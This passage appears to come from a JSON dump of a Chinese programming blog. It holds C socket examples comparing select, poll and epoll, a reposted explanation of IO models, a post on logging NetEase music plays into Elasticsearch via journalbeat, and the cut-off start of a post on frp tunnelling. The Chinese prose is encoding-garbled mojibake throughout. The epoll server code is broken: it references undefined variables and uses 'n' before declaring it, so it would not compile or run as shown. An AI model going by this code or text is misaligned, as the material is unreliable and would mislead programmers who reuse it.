&allset);\n\t\t\t\t\tclients[i] = -1;\n\t\t\t\t} else {\n\t\t\t\t\tfor (int i = 0; i < n; ++i) {\n\t\t\t\t\t\tbuf[i] = toupper(buf[i]);\n\t\t\t\t\t}\n\t\t\t\t\tWrite(fd, buf, n);\n\t\t\t\t}\n\t\t\t\tif (--iready == 0) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\treturn 0;\n}\n```\n\n`client.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include \"wrap.h\"\n\n\n#define PORT 8000\n#define MAXLINE 1024\nint main(int argc, char* agrv[])\n{\n\tchar buf[MAXLINE];\n\tmemset(buf, 0, sizeof(buf));\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tinet_pton(PF_INET, \"127.0.0.1\", &server.sin_addr);\n\n\tConnect(server_id, (struct sockaddr*)&server, sizeof(server));\n\n\twhile (fgets(buf, MAXLINE, stdin) != NULL) {\n\t\tWrite(server_id, buf, strlen(buf));\n\t\tint n = Read(server_id, buf, MAXLINE);\n\t\tif (n == 0) {\n\t\t\tprintf(\"the other side has been closed.\\n\");\n\t\t} else {\n\t\t\tWrite(STDOUT_FILENO, buf, n);\n\t\t}\n\t}\n\tClose(server_id);\n\treturn 0;\n}\n```\n\n\n\n### 4.2 poll\n\n`server.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <sys/select.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <poll.h>\n#include \"wrap.h\"\n\n#define PORT 8000\n#define MAXLINE 1024\n#define OPEN_MAX 1000\nint main()\n{\n\tchar buf[MAXLINE];\n\tchar str[INET_ADDRSTRLEN];\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server, client;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tserver.sin_addr.s_addr = htonl(INADDR_ANY);\n\t\n\tint opt = 1;\n\tsetsockopt(server_id, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));\n\n\tBind(server_id, (struct sockaddr*)&server, sizeof(server));\n\tListen(server_id, 20);\n\tprintf(\"Accept connections...\\n\");\n\n\n\tstruct pollfd clients[OPEN_MAX];\n\tclients[0].fd = server_id;\n\tclients[0].events = POLLIN;\n\tfor (int i = 1; i < OPEN_MAX; i++) {\n\t\tclients[i].fd = -1;\n\t}\n\n\tint maxi = 0;\n\twhile (1) {\n    // ç›‘å¬ POLLIN äº‹ä»¶\n\t\tint iready = poll(clients, maxi+1, -1);\t\n\t\tif (iready < 0) {\n\t\t\tperr_exit(\"poll error\");\n\t\t}\n\t\t\n    // è¯´æ˜ client æ¥äº†å†™\n\t\tif (clients[0].revents & POLLIN) {\n\t\t\tsocklen_t len = sizeof(client);\n\t\t\tint client_id = Accept(server_id, (struct sockaddr*)&client, &len);\t\n\t\t\tprintf(\"received from %s at PORT %d\\n\",\n\t\t\t\t\tinet_ntop(PF_INET, &client.sin_addr, str, sizeof(str)),\n\t\t\t\t\tntohs(client.sin_port));\n\n\t\t\tint i = 1;\n\t\t\tfor (; i < OPEN_MAX; ++i) {\n\t\t\t\tif (clients[i].fd < 0) {\n\t\t\t\t\tclients[i].fd = client_id;\t\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (i == OPEN_MAX) {\n\t\t\t\tfputs(\"too many clients\\n\", stderr);\n\t\t\t\texit(1);\n\t\t\t}\n\n\t\t\tclients[i].events = POLLIN;\n\t\t\tif (i > maxi) {\n\t\t\t\tmaxi = i;\n\t\t\t}\n\t\t\tif (--iready == 0) {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\n\t\tfor (int i = 1; i <= maxi; ++i) {\n\t\t\tif (clients[i].fd < 0) {\n\t\t\t\tcontinue;\n\t\t\t}\t\n\n\t\t\tif (clients[i].revents & POLLIN) {\n\t\t\t\tint n = Read(clients[i].fd, buf, sizeof(buf));\n\t\t\t\tif (n == 0) {\n\t\t\t\t\tClose(clients[i].fd);\n\t\t\t\t\tclients[i].fd = -1;\n\t\t\t\t} else {\n\t\t\t\t\tfor (int i = 0; i < n; ++i) {\n\t\t\t\t\t\tbuf[i] = toupper(buf[i]);\n\t\t\t\t\t}\n\t\t\t\t\tWrite(clients[i].fd, buf, n);\n\t\t\t\t}\n\t\t\t\tif (--iready == 0) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n\n\n`client.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include \"wrap.h\"\n\n\n#define PORT 8000\n#define MAXLINE 1024\nint main(int argc, char* agrv[])\n{\n\tchar buf[MAXLINE];\n\tmemset(buf, 0, sizeof(buf));\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tinet_pton(PF_INET, \"127.0.0.1\", &server.sin_addr);\n\n\tConnect(server_id, (struct sockaddr*)&server, sizeof(server));\n\n\twhile (fgets(buf, MAXLINE, stdin) != NULL) {\n\t\tWrite(server_id, buf, strlen(buf));\n\t\tint n = Read(server_id, buf, MAXLINE);\n\t\tif (n == 0) {\n\t\t\tprintf(\"the other side has been closed.\\n\");\n\t\t} else {\n\t\t\tWrite(STDOUT_FILENO, buf, n);\n\t\t}\n\t}\n\tClose(server_id);\n\treturn 0;\n}\n```\n\n\n\n### 4.3 epoll\n\n`server.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <sys/epoll.h>\n#include \"wrap.h\"\n\n#define PORT 8000\n#define MAXLINE 1024\n#define OPEN_MAX 1000\n\nvoid add_event(int epollid, int fd, int state)\n{\n\tstruct epoll_event ev;\n\tev.data.fd = fd;\n\tev.events = state;\n\tepoll_ctl(epollid, EPOLL_CTL_ADD, fd, &ev);\n}\nvoid modify_event(int epollid, int fd, int state)\n{\n\tstruct epoll_event ev;\n\tev.data.fd = fd;\n\tev.events = state;\n\tepoll_ctl(epollid, EPOLL_CTL_MOD, fd, &ev);\n}\nvoid delete_event(int epollid, int fd, int state)\n{\n\tstruct epoll_event ev;\n\tev.data.fd = fd;\n\tev.events = state;\n\tepoll_ctl(epollid, EPOLL_CTL_DEL, fd, &ev);\n}\n\n\nint main()\n{\n\tchar buf[MAXLINE];\n\tchar str[INET_ADDRSTRLEN];\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server, client;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tserver.sin_addr.s_addr = htonl(INADDR_ANY);\n\t\n\tint opt = 1;\n\tsetsockopt(server_id, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));\n\n\tBind(server_id, (struct sockaddr*)&server, sizeof(server));\n\tListen(server_id, 20);\n\tprintf(\"Accept connections...\\n\");\n\n\n\tstruct epoll_event events[EPOLLEVENTS];\n\tint epollfd = epoll_create(FDSIZE);\n\n\tstruct epoll_event ev;\n\tev.events = EPOLLIN;\n\tev.data.fd = STDIN_FILENO;\n\tepoll_ctl(epollfd, EPOLL_CTL_ADD, STDIN_FILENO, &ev);\n\n\twhile (1) {\n\t\tint ret = epoll_wait(epollfd, events, EPOLLEVENTS, -1);\n\t\tfor (int i = 0; i < ret; ++i) {\n\t\t\tint fd = events[i].data.fd;\n\t\t\tif (fd == server_id && (events[i].events & EPOLLIN)) {\n\t\t\t\tsocklen_t len = sizeof(client);\n\t\t\t\tint client_id = Accept(server_id, (struct sockaddr*)&client, &len);\t\n\t\t\t\tprintf(\"received from %s at PORT %d\\n\",\n\t\t\t\t\t\tinet_ntop(PF_INET, &client.sin_addr, str, sizeof(str)),\n\t\t\t\t\t\tntohs(client.sin_port));\n\n\t\t\t\tstruct epoll_event ev;\n\t\t\t\tev.events = state;\n\t\t\t\tev.data.fd = fd;\n\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_ADD,fd,&ev);\n\n\t\t\t} else if (events[i].events & EPOLLIN) {\n\t\t\t\tint n = Read(clients[i].fd, buf, sizeof(buf));\n\t\t\t\tif (n == 0) {\n\t\t\t\t\tClose(clients[i].fd);\n\n\t\t\t\t\tstruct epoll_event ev;\n\t\t\t\t\tev.events = EPOLLIN;\n\t\t\t\t\tev.data.fd = fd;\n\t\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_DEL,fd,&ev);\n\n\t\t\t\t} else {\n\t\t\t\t\tstruct epoll_event ev;\n\t\t\t\t\tev.events = EPOLLOUT;//ç”±è¯»æ”¹ä¸ºå†™\n\t\t\t\t\tev.data.fd = fd;\n\t\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_MOD,fd,&ev);\n\t\t\t\t}\n\n\t\t\t} else if (events[i].events & EPOLLOUT) {\n\t\t\t\tfor (int i = 0; i < n; ++i) {\n\t\t\t\t\tbuf[i] = toupper(buf[i]);\n\t\t\t\t}\n\t\t\t\tint n = Write(fd, buf, n);\n\t\t\t\tif (n < 0) {\n\t\t\t\t\tstruct epoll_event ev;\n\t\t\t\t\tev.events = EPOLLIN;\n\t\t\t\t\tev.data.fd = fd;\n\t\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_DEL,fd,&ev);\n\n\t\t\t\t} else {\n\t\t\t\t\tstruct epoll_event ev;\n\t\t\t\t\tev.events = EPOLLIN;//ç”±å†™æ”¹ä¸ºè¯»\n\t\t\t\t\tev.data.fd = fd;\n\t\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_MOD,fd,&ev);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tClose(epollfd);\n\n\n\treturn 0;\n}\n```\n\n\n\n`client.c`\n\n```c\n#include <string.h>\n#include <sys/socket.h>\n#include <sys/epoll.h>\n#include <arpa/inet.h>\n#include <string.h>\n#include <stdio.h>\n#include <unistd.h>\n#include \"wrap.h\"\n#include \"epollUtil.h\"\n\n#define IP \"127.0.0.1\"\n#define PORT 8000\n#define FD_SIZE 1024\n#define EPOLLEVENTS 20\nint main(int agrc, char* argv[]) {\n\tchar buf[1024];\n\tmemset(buf, 0, sizeof(buf));\n\n\tstruct sockaddr_in server;\n\tbzero(&server, sizeof(server));\n\tserver.sin_family = AF_INET;\n\tserver.sin_port = htons(PORT);\n\tinet_pton(AF_INET, IP, &server.sin_addr);\n\t\n\n\tint server_id = Socket(AF_INET, SOCK_STREAM, 0);\n\tConnect(server_id, (struct sockaddr*)&server, sizeof(server));\n\n\tstruct epoll_event events[EPOLLEVENTS];\n\tint epollfd = epoll_create(FD_SIZE);\n\tadd_event(epollfd, STDIN_FILENO, EPOLLIN);\n\twhile (1) {\n\t\n\t\tint ret = epoll_wait(epollfd, events, EPOLLEVENTS, -1);\n\t\tfor (int i = 0; i < ret; ++i) {\n\t\t\tint fd = events[i].data.fd;\n\n\t\t\tif (events[i].events & EPOLLIN) {\n\t\t\t\tint n = Read(fd, buf, sizeof(buf));\t\n\t\t\t\tif (n == 0) {\n\t\t\t\t\tClose(fd);\t\n\t\t\t\t} else {\n\t\t\t\t\tif (fd == STDIN_FILENO) {\n\t\t\t\t\t\tadd_event(epollfd, server_id, EPOLLOUT);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tdelete_event(epollfd, server_id, EPOLLIN);\t\n\t\t\t\t\t\tadd_event(epollfd, STDOUT_FILENO, EPOLLOUT);\n\t\t\t\t\t}\t\n\t\t\t\t}\n\t\t\t} else if (events[i].events & EPOLLOUT) {\n\t\t\t\tWrite(fd, buf, strlen(buf));\t\n\t\t\t\tif (fd == STDOUT_FILENO) {\n\t\t\t\t\tdelete_event(epollfd, fd, EPOLLOUT);\n\t\t\t\t} else {\n\t\t\t\t\tmodify_event(epollfd, fd, EPOLLIN);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tClose(server_id);\n\treturn 0;\n}\n```\n\n\n\n### 4.4 æ€»ç»“\n\n+ select \n\n  æ­»å¾ªç¯é‡Œç”¨ select é˜»å¡, è¿”å›åå¼€å§‹éå†\n\n+ poll\n\n  æ­»å¾ªç¯é‡Œç”¨ poll é˜»å¡, è¿”å›åå¼€å§‹éå†\n\n+ epoll\n\n  æ­»å¾ªç¯é‡Œç”¨ epoll_wait é˜»å¡\n\n\n\n# 5. å¤´è„‘é£æš´\n\n### 5.1  ã€å¤šè·¯å¤ç”¨ã€‘VS ã€å¤šçº¿ç¨‹+ é˜»å¡IOã€‘\n\nä¹Ÿè®¸æœ‰æœ‹å‹ä¼šè¯´ï¼Œæˆ‘å¯ä»¥é‡‡ç”¨ å¤šçº¿ç¨‹+ é˜»å¡IO è¾¾åˆ°ç±»ä¼¼çš„æ•ˆæœï¼Œä½†æ˜¯ç”±äºåœ¨å¤šçº¿ç¨‹ + é˜»å¡IO ä¸­ï¼Œæ¯ä¸ªsocketå¯¹åº”ä¸€ä¸ªçº¿ç¨‹ï¼Œè¿™æ ·ä¼šé€ æˆå¾ˆå¤§çš„èµ„æºå ç”¨ï¼Œå¹¶ä¸”å°¤å…¶æ˜¯å¯¹äºé•¿è¿æ¥æ¥è¯´ï¼Œçº¿ç¨‹çš„èµ„æºä¸€ç›´ä¸ä¼šé‡Šæ”¾ï¼Œå¦‚æœåé¢é™†ç»­æœ‰å¾ˆå¤šè¿æ¥çš„è¯ï¼Œå°±ä¼šé€ æˆæ€§èƒ½ä¸Šçš„ç“¶é¢ˆã€‚\n\nè€Œå¤šè·¯å¤ç”¨IOæ¨¡å¼ï¼Œé€šè¿‡ä¸€ä¸ªçº¿ç¨‹å°±å¯ä»¥ç®¡ç†å¤šä¸ªsocketï¼Œåªæœ‰å½“socketçœŸæ­£æœ‰è¯»å†™äº‹ä»¶å‘ç”Ÿæ‰ä¼šå ç”¨èµ„æºæ¥è¿›è¡Œå®é™…çš„è¯»å†™æ“ä½œã€‚å› æ­¤ï¼Œå¤šè·¯å¤ç”¨IOæ¯”è¾ƒé€‚åˆè¿æ¥æ•°æ¯”è¾ƒå¤šçš„æƒ…å†µã€‚\n\nå¦å¤–å¤šè·¯å¤ç”¨IOä¸ºä½•æ¯”éé˜»å¡IOæ¨¡å‹çš„æ•ˆç‡é«˜æ˜¯å› ä¸ºåœ¨éé˜»å¡IOä¸­ï¼Œä¸æ–­åœ°è¯¢é—®socketçŠ¶æ€æ—¶é€šè¿‡ç”¨æˆ·çº¿ç¨‹å»è¿›è¡Œçš„ï¼Œè€Œåœ¨å¤šè·¯å¤ç”¨IOä¸­ï¼Œè½®è¯¢æ¯ä¸ªsocketçŠ¶æ€æ˜¯å†…æ ¸åœ¨è¿›è¡Œçš„ï¼Œè¿™ä¸ªæ•ˆç‡è¦æ¯”ç”¨æˆ·çº¿ç¨‹è¦é«˜çš„å¤šã€‚\n\n\n\n### 5.2  æˆ‘åœ¨çŸ¥ä¹çš„å›ç­”\n\nhttps://www.zhihu.com/question/32163005/answer/300165049\n\nIOæ¨¡å¼ä¸€èˆ¬åˆ†ä¸ºåŒæ­¥IOå’Œå¼‚æ­¥IO. åŒæ­¥IOä¼šé˜»å¡è¿›ç¨‹, å¼‚æ­¥IOä¸ä¼šé˜»å¡è¿›ç¨‹. ç›®å‰linuxä¸Šå¤§éƒ¨åˆ†ç”¨çš„æ˜¯åŒæ­¥IO, å¼‚æ­¥IOåœ¨linuxä¸Šç›®å‰è¿˜ä¸æˆç†Ÿ, ä¸è¿‡windowsçš„iocpç®—æ˜¯çœŸæ­£çš„å¼‚æ­¥IOã€‚\n\n\n\nåŒæ­¥IOåˆåˆ†ä¸ºé˜»å¡IO, éé˜»å¡IO, IOå¤šè·¯å¤ç”¨. What? åŒæ­¥IOæ˜æ˜ä¼šé˜»å¡è¿›ç¨‹,ä¸ºä»€ä¹ˆä¹ŸåŒ…æ‹¬éé˜»å¡IO? å› ä¸ºéé˜»å¡IOè™½ç„¶åœ¨è¯·æ±‚æ•°æ®æ—¶ä¸é˜»å¡, ä½†çœŸæ­£æ•°æ®æ¥ä¸´æ—¶,ä¹Ÿå°±æ˜¯å†…æ ¸æ•°æ®æ‹·è´åˆ°ç”¨æˆ·æ•°æ®æ—¶, æ­¤æ—¶è¿›ç¨‹æ˜¯é˜»å¡çš„.\n\n\n\né‚£ä¹ˆè¿™äº›IOæ¨¡å¼çš„åŒºåˆ«åˆ†åˆ«æ˜¯ä»€ä¹ˆ? æ¥ä¸‹æ¥ä¸¾ä¸ªå°ä¾‹å­æ¥è¯´æ˜. å‡è®¾ä½ ç°åœ¨å»å¥³ç”Ÿå®¿èˆæ¥¼æ‰¾è‡ªå·±çš„å¥³ç¥, ä½†æ˜¯ä½ åªçŸ¥é“å¥³ç¥çš„æ‰‹æœºå·,å¹¶ä¸çŸ¥é“å¥³ç¥çš„å…·ä½“æˆ¿é—´\n\n\n\nå…ˆè¯´åŒæ­¥IOçš„æƒ…å†µ,\n\n1. é˜»å¡IO, ç»™å¥³ç¥å‘ä¸€æ¡çŸ­ä¿¡, è¯´æˆ‘æ¥æ‰¾ä½ äº†, ç„¶åå°±é»˜é»˜çš„ä¸€ç›´ç­‰ç€å¥³ç¥ä¸‹æ¥¼, è¿™ä¸ªæœŸé—´é™¤äº†ç­‰å¾…ä½ ä¸ä¼šåšå…¶ä»–äº‹æƒ…, å±äºå¤‡èƒåšæ³•.\n\n\n\n2. éé˜»å¡IO, ç»™å¥³ç¥å‘çŸ­ä¿¡, å¦‚æœä¸å›, æ¥ç€å†å‘, ä¸€ç›´å‘åˆ°å¥³ç¥ä¸‹æ¥¼, è¿™ä¸ªæœŸé—´ä½ å¯ä»¥åœ¨ä¸¤æ¬¡å‘çŸ­ä¿¡é—´éš™å–å£æ°´ï¼Œå±äºä¸“ä¸€åšæ³•.\n\n\n\n3. IOå¤šè·¯å¤ç”¨, æ˜¯æ‰¾ä¸€ä¸ªå®¿ç®¡å¤§å¦ˆæ¥å¸®ä½ ç›‘è§†ä¸‹æ¥¼çš„å¥³ç”Ÿ, è¿™ä¸ªæœŸé—´ä½ å¯ä»¥äº›å…¶ä»–çš„äº‹æƒ…. ä¾‹å¦‚å¯ä»¥é¡ºä¾¿çœ‹çœ‹å…¶ä»–å¦¹å­,ç©ç©ç‹è€…è£è€€, ä¸Šä¸ªå•æ‰€ç­‰ç­‰. IOå¤ç”¨åˆåŒ…æ‹¬ select, poll, epoll æ¨¡å¼. é‚£ä¹ˆå®ƒä»¬çš„åŒºåˆ«æ˜¯ä»€ä¹ˆ?\n\n\n\n3.1 selectå¤§å¦ˆ æ¯ä¸€ä¸ªå¥³ç”Ÿä¸‹æ¥¼, selectå¤§å¦ˆéƒ½ä¸çŸ¥é“è¿™ä¸ªæ˜¯ä¸æ˜¯ä½ çš„å¥³ç¥, å¥¹éœ€è¦ä¸€ä¸ªä¸€ä¸ªè¯¢é—®, å¹¶ä¸”selectå¤§å¦ˆèƒ½åŠ›è¿˜æœ‰é™, æœ€å¤šä¸€æ¬¡å¸®ä½ ç›‘è§†1024ä¸ªå¦¹å­\n\n\n\n3.2 pollå¤§å¦ˆä¸é™åˆ¶ç›¯ç€å¥³ç”Ÿçš„æ•°é‡, åªè¦æ˜¯ç»è¿‡å®¿èˆæ¥¼é—¨å£çš„å¥³ç”Ÿ, éƒ½ä¼šå¸®ä½ å»é—®æ˜¯ä¸æ˜¯ä½ å¥³ç¥\n\n\n\n3.3 epollå¤§å¦ˆä¸é™åˆ¶ç›¯ç€å¥³ç”Ÿçš„æ•°é‡, å¹¶ä¸”ä¹Ÿä¸éœ€è¦ä¸€ä¸ªä¸€ä¸ªå»é—®. é‚£ä¹ˆå¦‚ä½•åšå‘¢? epollå¤§å¦ˆä¼šä¸ºæ¯ä¸ªè¿›å®¿èˆæ¥¼çš„å¥³ç”Ÿè„¸ä¸Šè´´ä¸Šä¸€ä¸ªå¤§å­—æ¡,ä¸Šé¢å†™ä¸Šå¥³ç”Ÿè‡ªå·±çš„åå­—, åªè¦å¥³ç”Ÿä¸‹æ¥¼äº†, epollå¤§å¦ˆå°±çŸ¥é“è¿™ä¸ªæ˜¯ä¸æ˜¯ä½ å¥³ç¥äº†, ç„¶åå¤§å¦ˆå†é€šçŸ¥ä½ .\n\n\n\nä¸Šé¢è¿™äº›åŒæ­¥IOæœ‰ä¸€ä¸ªå…±åŒç‚¹å°±æ˜¯, å½“å¥³ç¥èµ°å‡ºå®¿èˆé—¨å£çš„æ—¶å€™, ä½ å·²ç»ç«™åœ¨å®¿èˆé—¨å£ç­‰ç€å¥³ç¥çš„, æ­¤æ—¶ä½ å±äºé˜»å¡çŠ¶æ€\n\n\n\næ¥ä¸‹æ¥æ˜¯å¼‚æ­¥IOçš„æƒ…å†µ\n\nä½ å‘Šè¯‰å¥³ç¥æˆ‘æ¥äº†, ç„¶åä½ å°±å»ç‹è€…è£è€€äº†, ä¸€ç›´åˆ°å¥³ç¥ä¸‹æ¥¼äº†, å‘ç°æ‰¾ä¸è§ä½ äº†, å¥³ç¥å†ç»™ä½ æ‰“ç”µè¯é€šçŸ¥ä½ , è¯´æˆ‘ä¸‹æ¥¼äº†, ä½ åœ¨å“ªå‘¢? è¿™æ—¶å€™ä½ æ‰æ¥åˆ°å®¿èˆé—¨å£. æ­¤æ—¶å±äºé€†è¢­åšæ³•\n\n# 6. å‚è€ƒèµ„æ–™\n\n+ https://www.liuvv.com/p/9864e52a.html\n+ https://www.zhihu.com/question/59975081\n+ https://xiaolincoding.com/os/8_network_system/selete_poll_epoll.html\n\n\n\n","tags":["io"],"categories":["io"]},{"title":"elasticsearchå±•ç¤ºç½‘æ˜“äº‘å¬æ­Œè®°å½•","url":"%2Fp%2F84fd7308.html","content":"\næ‰“å·¥äººæ¯æ—¥ç½‘æŠ‘äº‘, æ‰€ä»¥å°±ç”¨ esç®€å•åšä¸ªç½‘æ˜“äº‘å¬æ­Œè®°å½•. å…ˆä¸Šæ•ˆæœå›¾.\n\n![1](elasticsearchå±•ç¤ºç½‘æ˜“äº‘å¬æ­Œè®°å½•/1.png)\n\n<!-- more -->\n\n![1](elasticsearchå±•ç¤ºç½‘æ˜“äº‘å¬æ­Œè®°å½•/2.png)\n\n\n\n# 1. å‰ç½®æ¡ä»¶\n\n### 1.1 ä»£ç†è¯·æ±‚\n\nå¦‚æœæƒ³è®°å½•ç½‘æ˜“äº‘å¬æ­Œè®°å½•,  å°±è¦ä»£ç†ç½‘æ˜“äº‘è¯·æ±‚. ä½¿ç”¨äº†ä»¥ä¸‹æœåŠ¡, å³èƒ½ä»£ç†è¯·æ±‚, ä¹Ÿèƒ½è§£é”ç°è‰²ç½‘æŠ‘äº‘æ­Œæ›²\n\nhttps://github.com/nondanee/UnblockNeteaseMusic\n\n### 1.2 æ ¼å¼åŒ–è¾“å‡º\n\nä¸ºäº†es æ–¹ä¾¿æ˜¾ç¤ºå’Œæœç´¢æ•°æ®.  éœ€è¦å¯¹ç»Ÿè®¡çš„æ•°æ®, è¾“å‡º json.\n\næ‰€ä»¥éœ€è¦ä¿®æ”¹ä¸Šè¿°æœåŠ¡, è‡ªå®šä¹‰è‡ªå·±çš„æ ¼å¼åŒ– json è¾“å‡º.\n\nå‚è€ƒè‡ªå·±çš„å®šä¹‰ç»“æ„:\n\nhttps://github.com/unix2dos/UnblockNeteaseMusic/commit/19232978dec11d260e1da846350101751e276143\n\n### 1.3 å®‰è£…es\n\nå‚è€ƒ: https://www.liuvv.com/p/4986eca1.html\n\nå› ä¸ºæœåŠ¡ç”¨çš„ systemctl å¯åŠ¨çš„, ä¸ºäº†æ–¹ä¾¿, æ²¡æœ‰ä½¿ç”¨ filebeat, ä½¿ç”¨çš„ journalbeat æ”¶é›†\n\n\n\n# 2. é…ç½®\n\n### 2.1 journalbeat é…ç½®\n\nå› ä¸ºè‡ªå®šä¹‰è¾“å‡ºäº† json, æ‰€ä»¥éœ€è¦beatè‡ªåŠ¨è§£æ json å­—æ®µ, è¾“å‡ºåˆ° es é‡Œé¢.\n\næ³¨æ„æŠŠ`decode_json_fields` æ”¾åœ¨äº†`drop_fields`çš„ä¸Šé¢, å› ä¸ºè§£æ`message` jsonå, å†æ”¾å¼ƒåŸç”Ÿçš„`message`ä¿¡æ¯.\n\n+ journalbeat.yml\n\n```\nprocessors:\n  - decode_json_fields:\n      fields: [\"message\"]\n      process_array: true\n      max_depth: 10\n      target: \"\"\n      overwrite_keys: true\n\n  - drop_fields:\n      fields: [\"message\", \"journald\", \"syslog\", \"log\", \"host\", \"event\", \"ecs\", \"agent\", \"process\", \"systemd\"]\n```\n\n\n\n+ å¯åŠ¨é”™è¯¯1\n\n  Failed to connect to backoff(elasticsearch(http://localhost:9200)): Connection marked as failed because the onConnect callback failed: resource 'journalbeat-7.10.2' exists, but it is not an alias\n\n  \n\n  é‡æ–°åˆ é™¤ç´¢å¼•, å†æ¬¡å¯åŠ¨ç¨‹åº,  åœ¨ index é‚£é‡Œå‡ºç°ä¸¤ä¸ª, ä¸€ä¸ª index, ä¸€ä¸ª alias å³å¯è§£å†³.\n\n\n\n+ å¯åŠ¨é”™è¯¯2 \n\n  object mapping for [url] tried to parse field [url] as object, but found a concrete value\n\n  \n\n  å› ä¸ºurl æ˜¯å…³é”®è¯, éœ€è¦åœ¨ url çš„å‰é¢å¢åŠ äº†å‰ç¼€,  ä¾‹å¦‚`lw_url`.\n\n\n\n### 2.2 jsonå­—æ®µå¢åŠ ç´¢å¼•\n\n\nå»å»ºç«‹ç´¢å¼•çš„åœ°æ–¹åˆ·æ–°å³å¯.\n\n![1](elasticsearchå±•ç¤ºç½‘æ˜“äº‘å¬æ­Œè®°å½•/3.png)\n\n\n\n# 3. æ˜¾ç¤º\n\n### 3.1 rowåˆ†æ®µ\n\nAdd Sub-Bucket ->Terms, é€‰æ‹©æŒ‡å®šå­—æ®µ\n![1](elasticsearchå±•ç¤ºç½‘æ˜“äº‘å¬æ­Œè®°å½•/4.png)\n\n\n### 3.2 æ­Œæ›²å¢åŠ  play\n\nå»ç´¢å¼•ç®¡ç†, å­—æ®µç¼–è¾‘, string -> url -> audio\n\n![1](elasticsearchå±•ç¤ºç½‘æ˜“äº‘å¬æ­Œè®°å½•/6.png)\n\n\n\n### 3.3 æ›¿æ¢å­—æ®µå†…å®¹\n\nå»ç´¢å¼•ç®¡ç†, å­—æ®µç¼–è¾‘, string -> string Static lookup\n![1](elasticsearchå±•ç¤ºç½‘æ˜“äº‘å¬æ­Œè®°å½•/5.png)\n\n\n\n### 3.4 æ›¿æ¢å­—æ®µåå­—\n\n 7.10.1ç‰ˆæœ¬è¿˜ä¸æ”¯æŒ, 7.11.0ç‰ˆæœ¬å·²ç»æ”¯æŒ\n\nå‚è€ƒè¿™ä¸ªæäº¤: https://github.com/elastic/kibana/pull/70039\n\n\n\n# 4. è·å–æ•°æ®\n\n+ æŸ¥çœ‹æ‰€æœ‰ç´¢å¼•\n\n```Â bash\nGET /_cat/indices?v\n```\n\n+ æŸ¥è¯¢æŒ‡å®šå­—æ®µæ•°æ®\n\n```Â bash\nGET _search\n{\n  \"query\": {\n    \"match\": {\n      \"lw_value.name\": \"åŒæˆªæ£\"\n    }\n  }\n}\n```\n\n+ æŸ¥è¯¢å­—æ®µä¸ºç©ºçš„æ•°æ®\n\n```Â bash\nGET _search\n{\n  \"query\": {\n    \"bool\": {\n      \"must_not\": {\n        \"exists\": {\n          \"field\": \"lw_value.name\"\n        }\n      }\n    }\n  }\n}\n```\n\n+ åˆ é™¤æŸ¥è¯¢æ•°æ®\n\n```Â bash\nPOST /journalbeat-7.10.2-2021.01.24-000001/_delete_by_query\n{\n  \"query\": {\n    \"bool\": {\n      \"must_not\": {\n        \"exists\": {\n          \"field\": \"lw_value.name\"\n        }\n      }\n    }\n  }\n}\n```\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://elasticstack.blog.csdn.net/article/details/108146888","tags":["netease"],"categories":["elk"]},{"title":"frpå†…ç½‘ç©¿é€çš„å®è·µ","url":"%2Fp%2Fcc6fa0e8.html","content":"\n\n\n### 0. ä¸ºä»€ä¹ˆå†…ç½‘ç©¿é€\n\nä»å…¬ç½‘ä¸­è®¿é—®è‡ªå·±çš„ç§æœ‰è®¾å¤‡å‘æ¥æ˜¯ä¸€ä»¶éš¾äº‹å„¿ã€‚\n\nè‡ªå·±çš„ä¸»åŠ›å°å¼æœºã€NASç­‰ç­‰è®¾å¤‡ï¼Œå®ƒä»¬å¯èƒ½å¤„äºè·¯ç”±å™¨åï¼Œæˆ–è€…è¿è¥å•†å› ä¸ºIPåœ°å€çŸ­ç¼ºä¸ç»™ä½ 